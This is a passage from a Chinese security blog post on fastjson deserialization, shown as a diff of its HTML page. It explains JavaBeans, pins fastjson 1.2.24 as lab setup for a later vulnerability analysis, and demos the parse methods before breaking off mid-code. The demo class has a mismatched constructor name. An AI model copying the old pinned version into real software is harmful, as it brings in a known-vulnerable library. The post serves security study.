@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Fastjson反序列化 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='代码审计, java安全' />
+  <meta itemprop="name" content="fastjson反序列化">
+  <meta itemprop="datePublished" content="2024-09-04T17:35:01+08:00">
+  <meta itemprop="dateModified" content="2024-09-04T17:35:01+08:00">
+  <meta itemprop="wordCount" content="777">
+  <meta itemprop="keywords" content="代码审计,Java安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="fastjson反序列化">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-09-04T17:35:01+08:00">
+    <meta property="article:modified_time" content="2024-09-04T17:35:01+08:00">
+    <meta property="article:tag" content="代码审计">
+    <meta property="article:tag" content="Java安全">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="fastjson反序列化">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jndi%E6%B3%A8%E5%85%A5-%E5%9F%BA%E7%A1%80/" /><link rel="next" href="https://dongyu29.github.io/about/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "fastjson反序列化",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, java安全","wordcount":  777 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/","datePublished": "2024-09-04T17:35:01+08:00","dateModified": "2024-09-04T17:35:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">Fastjson反序列化</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Fastjson反序列化</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-09-04 17:35:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-09-04">2024-09-04</time></span>&nbsp;<span title="777 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 800 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>4 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#基础概念">基础概念</a></li>
+    <li><a href="#三种反序列化方法比较">三种反序列化方法比较</a></li>
+    <li><a href="#type">@type</a></li>
+    <li><a href="#serializerfeaturewriteclassname">SerializerFeature.WriteClassName</a></li>
+    <li><a href="#featuresupportnonpublicfield反序列化">Feature.SupportNonPublicField(反序列化)</a></li>
+    <li><a href="#parse与parseobject区别">parse与parseObject区别</a></li>
+    <li><a href="#漏洞原理">漏洞原理</a></li>
+    <li><a href="#fastjson各版本漏洞分析">Fastjson各版本漏洞分析</a>
+      <ul>
+        <li><a href="#fastjson1224">fastjson&lt;=1.2.24</a></li>
+      </ul>
+    </li>
+    <li><a href="#未完待续">未完待续</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h2 id="基础概念" class="heading-element"><span>基础概念</span>
+  <a href="#%e5%9f%ba%e7%a1%80%e6%a6%82%e5%bf%b5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，<strong>支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean</strong>。</p>
+<p>JAVAbean之前学某个链子的时候用过，感觉就是一种封装</p>
+<p><a href="https://liaoxuefeng.com/books/java/oop/core/javabean/index.html"target="_blank" rel="external nofollow noopener noreferrer">https://liaoxuefeng.com/books/java/oop/core/javabean/index.html</a></p>
+<blockquote>
+<p>在Java中，有很多<code>class</code>的定义都符合这样的规范：</p>
+<ul>
+<li>若干<code>private</code>实例字段；</li>
+<li>通过<code>public</code>方法来读写实例字段。</li>
+</ul>
+<p>例如：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">Person</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">name</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#ff636f">int</span> <span style="color:#58a1dd">age</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">getName</span>() { <span style="color:#ff636f">return</span> <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">name</span>; }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">setName</span>(<span style="color:#58a1dd">String</span> <span style="color:#58a1dd">name</span>) { <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">name</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">name</span>; }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">int</span> <span style="color:#58a1dd">getAge</span>() { <span style="color:#ff636f">return</span> <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">age</span>; }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">setAge</span>(<span style="color:#ff636f">int</span> <span style="color:#58a1dd">age</span>) { <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">age</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">age</span>; }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>如果读写方法符合以下这种命名规范：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// 读方法:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#58a1dd">Type</span> <span style="color:#58a1dd">getXyz</span>()
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// 写方法:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">setXyz</span>(<span style="color:#58a1dd">Type</span> <span style="color:#58a1dd">value</span>)</span></span></code></pre></div><p>那么这种<code>class</code>被称为<code>JavaBean</code></p>
+</blockquote>
+<p>fastjson文档 <a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a></p>
+<p>fastjson的API十分简洁。</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">String</span> <span style="color:#58a1dd">text</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">JSON</span>.<span style="color:#58a1dd">toJSONString</span>(<span style="color:#58a1dd">obj</span>); <span style="color:#828b96;font-style:italic">//序列化</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">VO</span> <span style="color:#58a1dd">vo</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">JSON</span>.<span style="color:#58a1dd">parseObject</span>(<span style="color:#a6be9d">&#34;{...}&#34;</span>, <span style="color:#58a1dd">VO</span>.<span style="color:#58a1dd">class</span>); <span style="color:#ff636f">//</span><span style="color:#58a1dd">反序列化</span></span></span></code></pre></div><p>maven依赖</p>
+<pre tabindex="0"><code>&lt;dependency&gt;
+    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
+    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
+    &lt;version&gt;x.x.x&lt;/version&gt;
+&lt;/dependency&gt;</code></pre><p>其中x.x.x是版本号，根据需要使用特定版本，建议使用最新版本。</p>
+<h2 id="三种反序列化方法比较" class="heading-element"><span>三种反序列化方法比较</span>
+  <a href="#%e4%b8%89%e7%a7%8d%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%96%b9%e6%b3%95%e6%af%94%e8%be%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>导入包</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#58a1dd">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">&lt;groupId&gt;</span>com.alibaba<span style="color:#58a1dd">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">&lt;artifactId&gt;</span>fastjson<span style="color:#58a1dd">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">&lt;version&gt;</span>1.2.24<span style="color:#58a1dd">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&lt;/dependency&gt;</span></span></span></code></pre></div><p>demo</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">package</span> <span style="color:#58a1dd">demo</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.alibaba.fastjson.JSON</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">demo</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">name</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#ff636f">int</span> <span style="color:#58a1dd">age</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">User</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;调用constructor&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">getName</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;调用getName&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#58a1dd">name</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">setName</span>(<span style="color:#58a1dd">String</span> <span style="color:#58a1dd">name</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;调用setName&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">name</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">name</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">int</span> <span style="color:#58a1dd">getAge</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;调用getAge&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#58a1dd">age</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">setAge</span>(<span style="color:#ff636f">int</span> <span style="color:#58a1dd">age</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;调用setAge&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">age</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">age</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>json反序列化</p>
+<p>使用<code>toJSONString</code>把UserBean序列化成json，测试三种反序列化的方法</p>
+<ul>
+<li>JSON.parse(s1)</li>
+<li>JSON.parseObject(s1)</li>
+<li>JSON.parseObject(s1,Object.class)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">package</span> <span style="color:#58a1dd">demo</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.alibaba.fastjson.JSON</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.alibaba.fastjson.serializer.SerializerFeature</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">Main</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">//创建一个用于实验的user类</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">User</span> <span style="color:#58a1dd">user1</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">User</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">user1</span>.<span style="color:#58a1dd">setName</span>(<span style="color:#a6be9d">&#34;xxx&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">user1</span>.<span style="color:#58a1dd">setAge</span>(<span style="color:#58a1dd">18</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">//序列化</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">serializedStr</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">JSON</span>.<span style="color:#58a1dd">toJSONString</span>(<span style="color:#58a1dd">user1</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;serializedStr= &#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">serializedStr</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">//通过parse方法进行反序列化，返回的是一个JSONObject</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;1.parse方法进行反序列化:&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">obj1</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">JSON</span>.<span style="color:#58a1dd">parse</span>(<span style="color:#58a1dd">serializedStr</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;parse反序列化对象名称:&#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">obj1</span>.<span style="color:#58a1dd">getClass</span>().<span style="color:#58a1dd">getName</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;parse反序列化：&#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">obj1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">//通过parseObject,不指定类，返回的是一个JSONObject</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;2.parseObject不指定类进行反序列化:&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">obj2</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">JSON</span>.<span style="color:#58a1dd">parseObject</span>(<span style="color:#58a1dd">serializedStr</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;parseObject反序列化对象名称:&#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">obj2</span>.<span style="color:#58a1dd">getClass</span>().<span style="color:#58a1dd">getName</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;parseObject反序列化:&#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">obj2</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">//通过parseObject,指定类后返回的是一个相应的类对象</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;3.parseObject指定类进行反序列化:&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">obj3</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">JSON</span>.<span style="color:#58a1dd">parseObject</span>(<span style="color:#58a1dd">serializedStr</span>,<span style="color:#58a1dd">User</span>.<span style="color:#58a1dd">class</span>);
